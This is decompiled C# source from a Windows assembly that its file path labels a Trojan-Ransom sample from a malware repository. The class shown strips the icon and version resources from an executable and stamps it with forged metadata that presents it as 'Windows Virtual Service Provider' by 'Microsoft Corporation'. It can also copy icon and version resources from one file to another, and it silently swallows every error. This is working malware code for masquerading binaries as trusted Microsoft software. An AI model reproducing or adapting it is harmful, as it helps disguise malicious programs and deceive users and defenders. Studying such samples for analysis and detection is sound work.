// Decompiled with JetBrains decompiler
// Type: ns8.Class30
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: 8CAF3016-DE02-4666-A2B5-982FA29E174F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-984a52c83c3ff1c9888aca4f7ec6b56e5cc5b48a8c9f7a0aa34fe2db2fe8da59.exe

using ns0;
using ns1;
using ns3;
using ns5;
using ns7;
using System;
using System.Collections.Generic;

namespace ns8
{
  internal static class Class30
  {
    public static void smethod_0(string filename, bool removeIcon = true)
    {
      Class6 firstIcon;
      Class1 firstVersion;
      Class30.smethod_3(filename, out firstIcon, out firstVersion);
      if (firstVersion != null)
      {
        try
        {
          firstVersion.vmethod_3(filename);
        }
        catch
        {
        }
      }
      if (removeIcon)
      {
        if (firstIcon != null)
        {
          try
          {
            firstIcon.vmethod_3(filename);
          }
          catch
          {
          }
        }
      }
      Class1 class1 = new Class1();
      class1.method_5("1.0.7601.2342");
      class1.method_7("1.0.7601.2342");
      Class22 class22 = new Class22();
      class1[class22.method_0()] = (Class20) class22;
      Class21 class21 = new Class21();
      class21.method_4((ushort) 1033);
      class21.method_6((ushort) 1200);
      class22.method_3().Add(class21.method_0(), class21);
      class21["ProductName"] = "Windows Virtual Service Provider";
      class21["FileDescription"] = "Windows Virtual Service Provider";
      class21["CompanyName"] = "Microsoft Corporation\0";
      class21["LegalCopyright"] = "© Microsoft Corporation. All rights reserved.";
      class21["ProductVersion"] = string.Format("{0}\0", (object) class1.method_6());
      Class24 class24 = new Class24();
      class1[class24.method_0()] = (Class20) class24;
      Class23 class23 = new Class23("Translation");
      class24.method_3().Add(class23.method_0(), class23);
      class23[Class15.smethod_8()] = (ushort) 1300;
      if (class1.method_8() != null)
      {
        int uint9 = (int) class1.method_8().method_0().uint_9;
      }
      try
      {
        class1.vmethod_2(filename);
      }
      catch (Exception ex)
      {
      }
    }

    public static void smethod_1(string string_0)
    {
      Class6 firstIcon;
      Class1 firstVersion;
      Class30.smethod_3(string_0, out firstIcon, out firstVersion);
      if (firstVersion != null)
      {
        try
        {
          firstVersion.vmethod_3(string_0);
        }
        catch
        {
        }
      }
      if (firstIcon == null)
        return;
      try
      {
        firstIcon.vmethod_3(string_0);
      }
      catch
      {
      }
    }

    public static void smethod_2(string string_0, string string_1)
    {
      Class6 firstIcon1;
      Class1 firstVersion1;
      Class30.smethod_3(string_0, out firstIcon1, out firstVersion1);
      Class6 firstIcon2;
      Class1 firstVersion2;
      Class30.smethod_3(string_1, out firstIcon2, out firstVersion2);
      try
      {
        firstIcon2?.vmethod_3(string_1);
      }
      catch (Exception ex)
      {
      }
      try
      {
        firstVersion2?.vmethod_3(string_1);
      }
      catch (Exception ex)
      {
      }
      try
      {
        firstIcon1?.vmethod_2(string_1);
      }
      catch (Exception ex)
      {
      }
      try
      {
        firstVersion1?.vmethod_2(string_1);
      }
      catch (Exception ex)
      {
      }
    }

    private static void smethod_3(string filename, out Class6 firstIcon, out Class1 firstVersion)
    {
      firstIcon = (Class6) null;
      firstVersion = (Class1) null;
      try
      {
        using (Class36 class36 = new Class36())
        {
          class36.method_2(filename);
          foreach (KeyValuePair<Class40, List<Class0>> keyValuePair in class36.method_0())
          {
            Class38.Enum6 enum6;
            try
            {
              enum6 = keyValuePair.Key.method_2();
            }
            catch (Exception ex)
            {
              continue;
            }
            if (firstIcon == null && enum6 == Class38.Enum6.const_12)
              firstIcon = (Class6) keyValuePair.Value[0];
            else if (firstVersion == null && enum6 == Class38.Enum6.const_13)
              firstVersion = (Class1) keyValuePair.Value[0];
          }
        }
      }
      catch (Exception ex)
      {
      }
    }
  }
}
